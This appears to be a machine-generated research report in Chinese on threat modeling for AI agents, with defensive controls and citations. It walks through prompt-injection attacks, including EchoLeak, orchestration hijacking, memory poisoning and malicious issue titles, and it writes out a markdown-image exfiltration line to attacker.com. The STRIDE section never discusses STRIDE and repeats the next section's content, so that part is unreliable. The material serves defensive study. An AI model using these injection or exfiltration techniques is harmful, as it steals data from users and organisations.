# Deep Research 報告 — rc-20260830-003

- 研究主題：AI System Threat Modeling：STRIDE 模型在 AI 系統的應用、Agent-specific Attack Surface 分析、AI 系統的風險評估方法論、威脅建模工具與框架。涵蓋 LLM-based Agent、RAG 系統、Multi-agent 系統的威脅場景。
- Notebook：https://notebooklm.google.com/notebook/a4c1b3e2-f76d-4679-9bc0-d23c6c46a399
- 產生時間：2026-08-30T13:15:59.384Z
- 品質過濾：54 → 53 筆（移除 1 筆）
- 來源分類/重新命名：48 / 48 筆成功

## 研究結果

### 1. STRIDE 模型如何套用到 AI Agent 系統？每個面向（Spoofing/Tampering/Repudiation/Info Disclosure/Denial of Service/Elevation of Privilege）在 Agent 場景的具體威脅？

在 AI Agent 系統部署從概念驗證（PoC）走向生產環境的過程中，其**攻擊面（Attack Surface）**呈現了爆炸性的擴張 [1, 2]。與傳統軟體相比，AI Agent 具備**機率性推理、自主規劃、長期記憶以及工具調用**等特性，這使得安全團隊必須從「資料攝入（Ingestion）」與「系統架構（Architecture）」兩大維度來全面審視其攻擊面 [3-6]。

以下為您深度剖析 **AI Agent 的整體攻擊面**，並針對 **Prompt 注入、工具濫用、數據外洩、特權提升、供應鏈攻擊** 這五大核心威脅進行系統性的**分類與防禦規劃**。

---

## 一、 AI Agent 的攻擊面（Attack Surface）解析

AI Agent 的攻擊面可分為**資料攝入面**與**架構運行層**：

### 1. 資料與內容攝入面 (Data Ingestion Surfaces)
這是 Agent 最脆弱的入口，因為 Agent 需要隨時讀取外部環境的動態數據 [7, 8]：
*   **網頁與抓取內容 (Webpages & Scraped Content)：** 瀏覽工具拉回的 HTML、部落格、論壇或隱藏的網頁欄位 [9, 10]。
*   **文檔與知識庫 (PDFs & RAG Corpora)：** 用於檢索增強生成（RAG）的 PDF 檔案、企業 Wiki 系統、CRM 紀錄 [10, 11]。
*   **郵件與即時通訊 (Emails & Messages)：** 郵件主體、附件，或客服系統中的工單（這是 zero-click 攻擊的最常用入口） [12, 13]。
*   **長期記憶庫 (Memory Stores)：** 跨 Session 儲存對話歷史或用戶偏好的向量數據庫 [10, 14]。
*   **程式碼與配置檔 (Code Repos & Configs)：** 專案目錄下的配置文件（如 `.claude/settings.json`） [10, 15]。
*   **工具與 MCP 描述元 (Tool Metadata / Schemas)：** 外部工具伺服器（如 Model Context Protocol，簡稱 MCP）向 LLM 宣告的 JSON 參數定義 [10, 16]。

### 2. 架構與運行系統層 (Architectural Layers)
CSA 提出的 **MAESTRO 框架**將 Agent 生態系解構為七個安全層 [17-19]：
*   **模型層 (Layer 1 - Foundation Model)：** 基礎大語言模型的對齊護欄繞過（越獄） [19]。
*   **數據操作層 (Layer 2 - Data Operations)：** RAG 檢索管道與向量嵌入（Embedding）完整性 [20]。
*   **框架與推理層 (Layer 3 - Agent Frameworks)：** AutoGen、CrewAI 等推理規劃迴圈與 A2A（Agent-to-Agent）編排機制 [21, 22]。
*   **部署基礎設施層 (Layer 4 - Deployment & Infrastructure)：** 承載 Agent 容器的 host 主機、網路出口、服務帳號 [23, 24]。
*   **觀測層 (Layer 5 - Evaluation & Observability)：** 審計日誌、指標監控、人類確認點 [25]。
*   **安全與合規層 (Layer 6 - Security & Compliance)：** 憑證管理、策略引擎與身份認證邊界 [23]。
*   **生態系層 (Layer 7 - Agent Ecosystem)：** 整合第三方工具、技能插件商店（如 OpenClaw ClawHub）的安全 [15, 26]。

---

## 二、 五大核心威脅的分類與防禦策略

針對 **OWASP Agentic Top 10 (2026)** 與安全實務，我們對這五類威脅進行深入分類與實行防禦 [27, 28]：

```
                              ┌────────────────────────┐
                              │  AI Agent Ingestion    │◄─── (1) Prompt 注入 (IDPI, Hijack)
                              └───────────┬────────────┘
                                          │
                                          ▼
                              ┌────────────────────────┐
                              │  Orchestration Mesh    │◄─── (4) 特權提升 (CUA ScreenSwap)
                              └───────────┬────────────┘
                                          │
                                          ▼
                              ┌────────────────────────┐
                              │    MCP Tool Gateway    │◄─── (2) 工具濫用 (Confused Deputy)
                              └─────┬────────────┬─────┘
                                    │            │
                                    ▼            ▼
                        ┌──────────────┐      ┌──────────────┐
                        │Host/Sandbox  │      │Network Egress│◄─── (3) 數據外洩 (EchoLeak)
                        └──────┬───────┘      └──────────────┘
                               │
                               ▼
                        ┌──────────────┐
                        │ Dependencies │◄──────────────────── (5) 供應鏈漏洞 (Slopsquatting)
                        └──────────────┘
```

### 1. 提示詞注入攻擊 (Prompt Injection)
*   **核心威脅分類：**
    *   **直接提示詞注入 (Direct Injection / Jailbreak)：** 用於繞過安全對齊的惡意 Prompt，如著名的 "DAN" 角色扮演繞過 [29, 30]。
    *   **間接提示詞注入 (Indirect Prompt Injection, IDPI - ASI01)：** 攻擊者不直接接觸 AI，而是將惡意指令隱藏在 Agent 自動檢索的文檔、網頁或郵件中 [31, 32]。一旦檢索，指令自動觸發並劫持控制流 [33, 34]。**代表案例：** 2025 年揭露的 **EchoLeak (CVE-2025-32711)**，透過一封惡意電子郵件被 Copilot 索引，不需任何用戶點擊即可竊取數據 [32, 35]。
    *   **多代理控制流劫持 (MAS Hijacking / Orchestration Hijack)：** 在多代理系統中，利用 sub-agent 產生的中介日誌、traceback 錯誤報告（模擬 Python 異常），將惡意控制指令「清洗」後送達 Orchestrator，即便底層模型具有強烈對齊機制，仍能高機率劫持整體決策 [33, 36]。
    *   **提示詞感染 (Prompt Infection - ASI08)：** 具有傳播能力的間接注入。在多代理協作中，被注入的 Agent 會在發給下游 Agent 的訊息中附帶自身載荷，實現系統內部的連鎖感染 [37, 38]。
*   **防禦控制手段 (Remediation)：**
    *   **結構化查詢分離 (StruQ - Instruction/Data Separation)：** 使用明確的角色標記和 XML delimiters（如 `<retrieved_context>` 標記）將系統指令與檢索內容進行語義級隔離 [39]，強制模型將 tags 內的內容視為「僅用於總結與 reasoning 的被動數據」，絕不作為執行指令 [39]。
    *   **前端注入分類器 (Prompt Shield / Classifiers)：** 部署 Lakera Guard 等即時運行閘道，在 retrieved 數據加載到 Context Window 之前，利用快速的特徵模型進行靜態與語義檢索分類（精準度約 80-85%） [40, 41]。
    *   **資料出處完整性校驗 (Content Provenance)：** 僅檢索已通過加密簽章（Signed Content Sources）的信任資料來源 [40]。

---

### 2. 工具濫用與剝削 (Tool Abuse & Exploitation - ASI02)
*   **核心威脅分類：**
    *   **混淆代理人攻擊 (Confused Deputy / Tool Misuse)：** Agent 擁有廣泛的操作權限（讀寫文件、寫入 API），當遭遇間接注入後，Agent 在不知情的情況下執行了極具破壞性的指令（例如調用 AWS CLI 刪除主機，或調用 CLI 執行 shell 命令） [42, 43]。**代表案例：** 2026 年 **Cline 程式碼助手**與 2025 年 **Amazon Q Developer** 連鎖漏洞，惡意 GitHub issue title 迫使 Agent 自動下載並運行未經簽署的攻擊者套件，造成實質代碼執行（RCE） [44, 45]。
*   **防禦控制手段 (Remediation)：**
    *   **最小代理權限（Least Agency / Scoped Tools）：** 嚴格限制 Agent 連接工具的權限與範圍，禁止隨意暴露 `exec.Command` 或未經 parameter 審查的 CLI 工具 [46, 47]。
    *   **執行前參數語意驗證 (Parameter & Schema Validation)：** 在 Gateway 層實施 JSON Schema 強制校驗，防止 Agent 生成偏離工具預期（例如路徑穿越 `../../` 或 shell meta-characters 拼接）的 payload [48, 49]。
    *   **高風險操作人工確認點 (Human-in-the-Loop, HITL - ASI09)：** 對於發送郵件、修改配置、刪除數據、資金轉移等具有**不可逆後果**的操作，強制中斷 Agent 的自主執行，並彈出 Immutable（非 AI 生成）的「人類確認對話框」顯示 raw parameters 進行審核 [50, 51]。

---

### 3. 數據外洩 (Data Exfiltration)
*   **核心威脅分類：**
    *   **零點擊 markdown 圖片洩漏 (EchoLeak / Zero-click Exfiltration)：** 這是 Agent 中最典型的外洩通路。攻擊者注入指令提取 Context 中的敏感變數（如 API keys、SSH 金鑰、用戶私隱） [52, 53]，並將這些數據組裝成 `![image](https://attacker.com/leak.png?data=...)` 格式。當瀏覽器或 Agent 視窗自動渲染 markdown 時，數據即被無形中傳遞給外部伺服器，用戶全程無感知 [35, 54]。
    *   **記憶體污染引發的長期外洩 (Memory Poisoning - ASI06)：** 將外洩指令寫入 Agent 的長期 Memory 模組。即使當前對話 Session 關閉，後續用戶啟動新會話時，污染的 Memory 被調用，仍會持續將後續敏感信息外傳 [14, 55]。
*   **防禦控制手段 (Remediation)：**
    *   **封鎖「致命三要素」(The Lethal Trifecta)：** Simon Willison 提出，AI 系統僅在同時具備以下三要素時才會產生高危外洩風險：(1) **存取私有數據**、(2) **接觸受外來操控的非信任內容**、(3) **具有外部通信能力** [55, 56]。防禦的核心在於**打破此三要素的同台共存**。例如，如果 Agent 必須接觸外部信件（要素 2）和用戶信箱（要素 1），必須在網路出口層強制限制其 DNS 解析與 Egress 通訊（要素 3） [57]。
    *   **網路流出過濾 (Egress Filtering)：** 嚴格限制 Agent 連接外部 URL 的白名單，全面禁用 markdown 的自動圖片加載與自動重導向機制 [58, 59]。
    *   **對話 Memory 隔離與細粒度授權 (FGA)：** 使用 Fine-Grained Authorization (FGA) 的 RAG 隔離技術 [60]，確保 Agent 檢索記憶與文檔時僅獲取當前用戶具有存取權限的 token 集合，防止 cross-user 資料污染 [60]。

---

### 4. 特權提升 (Privilege Escalation - ASI03)
*   **核心威脅分類：**
    *   **身份繼承與歸因差距 (Attribution Gap)：** 許多企業為了開發便利，直接讓 Agent 繼承 Operator 人類的長期 OAuth Token，導致 Agent 遭到 Hijack 後能以高特權執行破壞性行為，且審計日誌無法釐清是人類還是 Agent 的操作 [42, 61]。
    *   **視覺混淆代理人 (Visual Confused Deputy / ScreenSwap)：** 針對使用電腦感知截圖進行低底層 GUI 操作（如 click(x,y)）的 **Computer-Using Agents (CUAs)** [62]。攻擊者在 CUA 的運作過程中，篡改截圖上的按鈕像素 [63]。例如將 restricted 的「Admin: 重設憑證」按鈕與 safe 的「Acknowledge Alert」按鈕在截圖上做像素對調 [64, 65]。LLM 在對調後的圖片上點擊了 Acknowledge 位置，但實際上點擊點卻擊中了 real display 的「重設憑證」，從而達成極為隱蔽的特權提升 [63]。
*   **防禦控制手段 (Remediation)：**
    *   **非人類身份 (Non-Human Identity, NHI) 獨立認證：** 為 Agent 部署獨立的 API Key 與身分憑證，禁用與人類共享 session 機制，封閉歸因差距 [61, 66]。
    *   **任務繫結的短期臨時授權 (Short-lived, Task-scoped Credentials)：** 採用 Attribute-Based Access Control (ABAC)，每次工具調用僅分發短效、針對單一任務的權限 ticket [67, 68]。
    *   **雙通道對比分類器 (Dual-Channel Contrastive Classification)：** 針對 CUAs 系統，部署一組獨立於 Agent 原生 loop 之外的安全檢測服務。該服務將 `click(x,y)` 的座標與真實截圖直接送入 Multimodal Embedding 模型進行驗證 [69, 70]，確認該座標的視覺特徵（Image channel）與操作意圖（Text channel）均處於 safe list 內，方准許點擊 [70]。

---

### 5. 供應鏈攻擊 (Supply Chain Attack - ASI04)
*   **核心威脅分類：**
    *   **惡意技能/MCP伺服器注入 (Malicious Skills & MCPs - AST01)：** Agentic 生態系極度依賴開源插件與 MCP 伺服器 [71]。**代表案例：** 2026 年開源 Agent 框架 OpenClaw 的 **ToxicSkills** 安全危機，ClawHub 插件商店中爆發 **ClawHavoc 戰役**，有 1,184 個開源技能被注入了 Trojan/PolySkill 病毒，專門竊取主機上的 SSH 密鑰與 API Keys [15]。
    *   **幻覺套件毒殺與 slopsquatting / phantom-squatting：** 由於 AI Agent 在自主生成代碼時，常有 5.2% - 21.7% 的機率會幻覺出不存在的 python / npm 套件名稱 [72]。攻擊者在野外對這些幻覺套件名稱進行預先搶註（Slopsquatting），當 Agent 自主運行 `pip install` 時，就會自動下載惡意程式並造成主機受駭 [72]。
*   **防禦控制手段 (Remediation)：**
    *   **AI 軟體物料清單 (AIBOM) 與依賴固化：** 對環境內使用的 foundational models、微調數據庫、MCP 伺服器與運行時工具鏈進行自動化發現，產出 AIBOM，並嚴格將 dependencies 的 hash 值進行 Immutable 釘選（Pinning） [28, 73]。
    *   **技能庫 Merkle root 簽署與靜態掃描：** 僅能安裝經過驗證且具有 cryptographically signed (Merkle root signing) 的技能插件 [74, 75]。
    *   **阻斷自主包安裝：** 在 sandbox 運行環境中禁用 package manager 的網路連線 [72]，或在 package install 動作中設定檢閱攔截機制，預防 slopsquatting 危害 [72, 76]。

---

## 🛡️ 實務落地治理建議

1.  **實行 Least Agency（最小代理原則）：** 儘快將 Agent 憑證與工具權限縮小至單一任務規格 [46, 77]。
2.  **打破「致命三要素」：** 絕不讓同一個 Agent **同時**處理外部不信任數據、接觸內部敏感資料、並具有向外傳輸（Egress）的通訊工具 [56, 57]。
3.  **使用 API 網關進行 runtime monitoring：** 在 IDE、CLI 與 CI/CD 邊界部署 AI 安全閘道（如 Snyk、Cycode、Airia），即時稽核 Agent 所執行的每一次 tool call 和 planning 決策 trace [78, 79]。

💡 **接下來，您是否希望我協助您針對上述其中一項威脅（例如實作 XML Sandboxing 防止間接 Prompt 注入，或是如何在 Python 中建立一個受限的 Docker ephemeral 沙箱環境），來為您撰寫具體的防禦程式碼與設定檔？**

**引用來源：**
- [1] [[Microsoft 官方] 技術文件 - 透過 Copilot Studio 因應 OWASP Agentic AI 十大風險](https://www.microsoft.com/en-us/security/blog/2026/03/30/addressing-the-owasp-top-10-risks-in-agentic-ai-with-microsoft-copilot-studio/)
- [2] [[Infosys] 企業方案 - 多 Agent AI 系統的分層防護安全策略](https://www.infosys.com/iki/perspectives/secure-multiagent-ai.html)
- [3] [[ioSENTRIX] 技術指南 - 機器學習管線風險對照與威脅建模](https://iosentrix.com/blog/ai-system-threat-modeling)
- [4] [[Lakera] 技術文章 - 間接 Prompt 注入對現代 AI 系統的破壞性安全漏洞](https://www.lakera.ai/blog/indirect-prompt-injection)
- [5] [[Lakera] 技術文章 - 間接 Prompt 注入對現代 AI 系統的破壞性安全漏洞](https://www.lakera.ai/blog/indirect-prompt-injection)
- [6] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [7] [[Frontier Model Forum] 技術報告 - 針對 AI Agent 的前沿新興安全實踐](https://www.frontiermodelforum.org/issue-briefs/emerging-security-practices-for-ai-agents/)
- [8] [[Lakera] 技術文章 - 間接 Prompt 注入對現代 AI 系統的破壞性安全漏洞](https://www.lakera.ai/blog/indirect-prompt-injection)
- [9] [[部落格文章] 案例研究 - 網頁端間接 Prompt 注入攻擊野外實錄](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/)
- [10] [[Lakera] 技術文章 - 間接 Prompt 注入對現代 AI 系統的破壞性安全漏洞](https://www.lakera.ai/blog/indirect-prompt-injection)
- [11] [[Atlan] 技術文章 - 2026 年 Prompt 注入攻擊如何侵入與劫持 AI Agent](https://atlan.com/know/prompt-injection-attacks-ai-agents/)
- [12] [[arXiv] 學術論文 - 多 Agent 系統中執行任意惡意代碼之安全性漏洞分析](https://arxiv.org/html/2503.12188v2)
- [13] [[Airia] 技術部落格 - 企業級 AI 與其尚未受到重視的 Prompt 注入攻擊面](https://airia.com/blog/prompt-injection-and-enterprise-ai-the-attack-surface-most-security-teams-arent-monitoring/)
- [14] [[Atlan] 技術文章 - 2026 年 Prompt 注入攻擊如何侵入與劫持 AI Agent](https://atlan.com/know/prompt-injection-attacks-ai-agents/)
- [15] [[OWASP] 官方標準 - Agentic Skills 十大安全風險指引](https://owasp.org/www-project-agentic-skills-top-10/)
- [16] [[Cloud Security Alliance] 技術報告 - 自主 AI Agent 的混淆代理人攻擊機制與防禦](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)
- [17] [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [18] [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [19] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [20] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [21] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [22] [[arXiv] 學術論文 - 多 Agent 系統中執行任意惡意代碼之安全性漏洞分析](https://arxiv.org/html/2503.12188v2)
- [23] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [24] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [25] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [26] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [27] [[Auth0] 技術部落格 - 從 OWASP Top 10 探討 Agent 應用程式之安全設計](https://auth0.com/blog/owasp-top-10-agentic-applications-lessons/)
- [28] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [29] [[Atlan] 技術文章 - 2026 年 Prompt 注入攻擊如何侵入與劫持 AI Agent](https://atlan.com/know/prompt-injection-attacks-ai-agents/)
- [30] [[Lakera] 技術文章 - 間接 Prompt 注入對現代 AI 系統的破壞性安全漏洞](https://www.lakera.ai/blog/indirect-prompt-injection)
- [31] [[技術部落格] 架構分析 - RAG 系統與 AI Agent 的隱蔽間接 Prompt 注入](https://aquilax.ai/blog/indirect-prompt-injection-rag-agents)
- [32] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [33] [[Promptfoo] 安全資料庫 - Agent 系統編排劫持攻擊與防護](https://www.promptfoo.dev/lm-security-db/vuln/agent-system-orchestration-hijack-11cbc618/)
- [34] [[Lakera] 技術文章 - 間接 Prompt 注入對現代 AI 系統的破壞性安全漏洞](https://www.lakera.ai/blog/indirect-prompt-injection)
- [35] [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [36] [[arXiv] 學術論文 - 多 Agent 系統中執行任意惡意代碼之安全性漏洞分析](https://arxiv.org/html/2503.12188v2)
- [37] [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [38] [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [39] [[技術部落格] 技術分析 - 檢索管線脆弱性與間接 Prompt 注入攻擊對 RAG 之威脅](https://neuralstackms.tech/rag-under-fire-retrieval-pipeline-vulnerabilities-indirect-prompt-injection)
- [40] [[技術部落格] 架構分析 - RAG 系統與 AI Agent 的隱蔽間接 Prompt 注入](https://aquilax.ai/blog/indirect-prompt-injection-rag-agents)
- [41] [[Lakera] 技術文章 - 間接 Prompt 注入對現代 AI 系統的破壞性安全漏洞](https://www.lakera.ai/blog/indirect-prompt-injection)
- [42] [[Cloud Security Alliance] 技術報告 - 自主 AI Agent 的混淆代理人攻擊機制與防禦](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)
- [43] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [44] [[Cloud Security Alliance] 技術報告 - 自主 AI Agent 的混淆代理人攻擊機制與防禦](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)
- [45] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [46] [[Lakera] 技術文章 - 間接 Prompt 注入對現代 AI 系統的破壞性安全漏洞](https://www.lakera.ai/blog/indirect-prompt-injection)
- [47] [[Cloud Security Alliance] 應用指南 - 將 MAESTRO 框架部署至 CI/CD Pipeline 實務](https://cloudsecurityalliance.org/blog/2026/02/11/applying-maestro-to-real-world-agentic-ai-threat-models-from-framework-to-ci-cd-pipeline)
- [48] [[ioSENTRIX] 技術指南 - 機器學習管線風險對照與威脅建模](https://iosentrix.com/blog/ai-system-threat-modeling)
- [49] [[安全指南] 備忘清單 - 檢索增強生成 (RAG) 安全實踐速查表](https://cheatsheetseries.owasp.org/cheatsheets/RAG_Security_Cheat_Sheet.html)
- [50] [[Auth0] 技術部落格 - 從 OWASP Top 10 探討 Agent 應用程式之安全設計](https://auth0.com/blog/owasp-top-10-agentic-applications-lessons/)
- [51] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [52] [[部落格文章] 案例研究 - 網頁端間接 Prompt 注入攻擊野外實錄](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/)
- [53] [[arXiv] 學術論文 - 跨越檢索障礙：針對 LLM 系統中真實世界的間接注入攻擊研究](https://arxiv.org/pdf/2601.07072)
- [54] [[Airia] 技術部落格 - 企業級 AI 與其尚未受到重視的 Prompt 注入攻擊面](https://airia.com/blog/prompt-injection-and-enterprise-ai-the-attack-surface-most-security-teams-arent-monitoring/)
- [55] [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [56] [[Frontier Model Forum] 技術報告 - 針對 AI Agent 的前沿新興安全實踐](https://www.frontiermodelforum.org/issue-briefs/emerging-security-practices-for-ai-agents/)
- [57] [[Frontier Model Forum] 技術報告 - 針對 AI Agent 的前沿新興安全實踐](https://www.frontiermodelforum.org/issue-briefs/emerging-security-practices-for-ai-agents/)
- [58] [[Atlan] 技術文章 - 2026 年 Prompt 注入攻擊如何侵入與劫持 AI Agent](https://atlan.com/know/prompt-injection-attacks-ai-agents/)
- [59] [[技術部落格] 安全評估 - 跨 AI Agent 的 Prompt 注入防禦成效評估](https://nhimg.org/community/nhi-breaches/prompt-injection-across-ai-agents-are-your-controls-keeping-up/)
- [60] [[Auth0] 技術部落格 - 從 OWASP Top 10 探討 Agent 應用程式之安全設計](https://auth0.com/blog/owasp-top-10-agentic-applications-lessons/)
- [61] [[Auth0] 技術部落格 - 從 OWASP Top 10 探討 Agent 應用程式之安全設計](https://auth0.com/blog/owasp-top-10-agentic-applications-lessons/)
- [62] [[arXiv] 學術論文 - 視覺混淆代理人：電腦使用 Agent perception 缺陷之漏洞利用與防禦](https://arxiv.org/html/2603.14707v1)
- [63] [[arXiv] 學術論文 - 視覺混淆代理人：電腦使用 Agent perception 缺陷之漏洞利用與防禦](https://arxiv.org/html/2603.14707v1)
- [64] [[arXiv] 學術論文 - 視覺混淆代理人：電腦使用 Agent perception 缺陷之漏洞利用與防禦](https://arxiv.org/html/2603.14707v1)
- [65] [[arXiv] 學術論文 - 視覺混淆代理人：電腦使用 Agent perception 缺陷之漏洞利用與防禦](https://arxiv.org/html/2603.14707v1)
- [66] [[Cloud Security Alliance] 技術報告 - 自主 AI Agent 的混淆代理人攻擊機制與防禦](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)
- [67] [[Infosys] 企業方案 - 多 Agent AI 系統的分層防護安全策略](https://www.infosys.com/iki/perspectives/secure-multiagent-ai.html)
- [68] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [69] [[arXiv] 學術論文 - 視覺混淆代理人：電腦使用 Agent perception 缺陷之漏洞利用與防禦](https://arxiv.org/html/2603.14707v1)
- [70] [[arXiv] 學術論文 - 視覺混淆代理人：電腦使用 Agent perception 缺陷之漏洞利用與防禦](https://arxiv.org/html/2603.14707v1)
- [71] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [72] [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [73] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [74] [[OWASP] 官方標準 - Agentic Skills 十大安全風險指引](https://owasp.org/www-project-agentic-skills-top-10/)
- [75] [[OWASP] 官方標準 - Agentic Skills 十大安全風險指引](https://owasp.org/www-project-agentic-skills-top-10/)
- [76] [[Augment Code] 企業指南 - 多 Agent AI 之企業運作風險、合規與安全防禦](https://www.augmentcode.com/guides/multi-agent-ai-security-risks-compliance-fixes)
- [77] [[Augment Code] 企業指南 - 多 Agent AI 之企業運作風險、合規與安全防禦](https://www.augmentcode.com/guides/multi-agent-ai-security-risks-compliance-fixes)
- [78] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [79] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)

### 2. AI Agent 的 Attack Surface 有哪些？Prompt injection、tool abuse、data exfiltration、privilege escalation、supply chain attack 的分類與防禦？

在 AI Agent 系統部署走向生產環境的過程中，其**攻擊面（Attack Surface）**呈現了與傳統軟體完全不同的擴張態勢。傳統安全框架主要針對確定性系統的輸入與輸出，而 AI Agent 因為具備**機率性推理、自主規劃、長期記憶以及工具調用**等特性 [1, 2]，使得安全團隊必須全面審視其動態運行與資料攝入的各個維度。

以下為您深度剖析 **AI Agent 的整體攻擊面**，並針對 **Prompt 注入、工具濫用、數據外洩、特權提升、供應鏈攻擊** 這五大核心威脅進行系統性的**分類與防禦規劃**。

---

### 一、 AI Agent 的攻擊面（Attack Surface）解析

AI Agent 的攻擊面可分為**架構運行層（縱向）**與**資料攝入面（橫向）**兩大維度：

#### 1. 七層架構運行攻擊面（依據 CSA MAESTRO 框架） [3]
雲端安全聯盟（CSA）提出的 MAESTRO 參考架構將 Agent 生態系解構為七個安全層 [3]：
*   **基礎模型層 (Layer 1 - Foundation Models)：** 基礎 LLM 及其推理機制，面臨提示詞注入、對齊規避（越獄）、模型竊取或受污染的訓練數據等威脅 [3-5]。
*   **數據操作層 (Layer 2 - Data Operations)：** 向量資料庫、RAG 知識庫與 Agent 長短期記憶 [3]。面臨經由日誌篡改引發的記憶污染或受污染的向量嵌入 [3, 6]。
*   **Agent 框架層 (Layer 3 - Agent Frameworks)：** 編排框架（如 AutoGen、CrewAI）、推理規劃迴圈與工具發送（Tool Dispatch）[3, 5]。主要威脅包括工具誤用、Agent 目標操縱與框架組件漏洞 [3, 7]。
*   **部署與基礎設施層 (Layer 4 - Deployment & Infrastructure)：** 承載 Agent 容器的伺服器、主機、網路與服務帳戶 [3, 8]，容易面臨基礎設施工具利用、容器逃逸與資源耗盡阻斷服務（DoS）[3, 8]。
*   **評估與觀測層 (Layer 5 - Evaluation & Observability)：** 審計日誌與除錯監控系統 [3, 9]。威脅包括日誌規避、多 Agent 工作流中的歸因差距、以及日誌/觀測數據中毒 [3, 9]。
*   **安全與合規層 (Layer 6 - Security & Compliance)：** 憑證管理、策略引擎與合規監控，主要漏洞在於治理與稽核失效及權限控制繞過 [3, 10]。
*   **Agent 工具與整合層/生態系層 (Layer 7 - Agent Tools & Integrations)：** 工具市集、Model Context Protocol (MCP)、Agent-to-Agent (A2A) 通訊協定 [3, 11]。此層極易因 Agent 協作、工具與記憶跨越組織邊界而產生複雜的複合式安全風險 [3, 11]。

#### 2. 資料與內容攝入面 (Data Ingestion Surfaces) [12]
這是 Agent 執行任務時，最容易接觸外部不可信內容的橫向入口，包含：
*   **動態網頁與抓取內容：** 瀏覽工具拉回的 HTML、論壇、部落格或隱藏的網頁欄位 [12]。
*   **文檔與知識庫：** 用於 RAG 的 PDF、企業 Wiki 系統、CRM 紀錄 [12]。
*   **郵件與元數據：** 郵件主體、附件、標頭、或客服系統中的工單 [12]。
*   **長期記憶庫：** 跨 Session 儲存對話歷史與用戶偏好的向量數據庫 [12]。
*   **代碼倉庫與配置文件：** 專案目錄下的配置文件（如 `.claude/settings.json`）[12]。

---

### 二、 五大核心威脅的分類與防禦策略

針對 **OWASP Agentic Top 10 (2026)** 與安全實務，以下為這五類威脅的詳細分類與防禦手段：

#### 1. 提示詞注入攻擊 (Prompt Injection)
*   **威脅分類：**
    *   **直接提示詞注入 (Direct Injection / Jailbreak)：** 攻擊者直接與模型介面交互，嵌入惡意指令（如越獄、角色扮演 "DAN"、系統提示詞提取）來繞過模型安全對齊 [13, 14]。
    *   **間接提示詞注入 (Indirect Prompt Injection, IPI / IDPI)：** 攻擊者將惡意指令植入外部文檔、網頁或電子郵件中 [15-17]。當 Agent 在執行任務時自動檢索並處理這些外部內容，就會觸發指令，劫持 Agent 行為 [15, 16, 18]。代表案例包括企業 copilot 遭遇的 **EchoLeak (CVE-2025-32711)**，利用 poisoned email 觸發 zero-click 數據外洩 [19-21]。
